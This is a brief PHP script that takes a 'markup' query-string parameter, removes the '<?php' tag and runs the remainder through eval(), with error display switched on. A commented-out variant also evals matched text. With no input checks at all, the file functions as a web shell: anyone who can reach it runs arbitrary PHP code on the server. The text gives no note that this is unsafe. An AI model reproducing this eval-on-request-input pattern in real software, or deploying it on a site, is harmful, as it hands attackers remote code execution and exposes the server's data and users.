<?php
ini_set('display_errors', 1); 
error_reporting(E_ALL);


$code = $_GET['markup'];
$code = str_replace("<?php","", $code);
echo eval($code);
/*$code = $_GET['markup'];
$code = preg_replace_callback(
        "%<?php ?>%",
        function ($matches) {
            return eval($matches[0]);
        },
        $line
    );

echo $code;*/
																																																																																																																																												
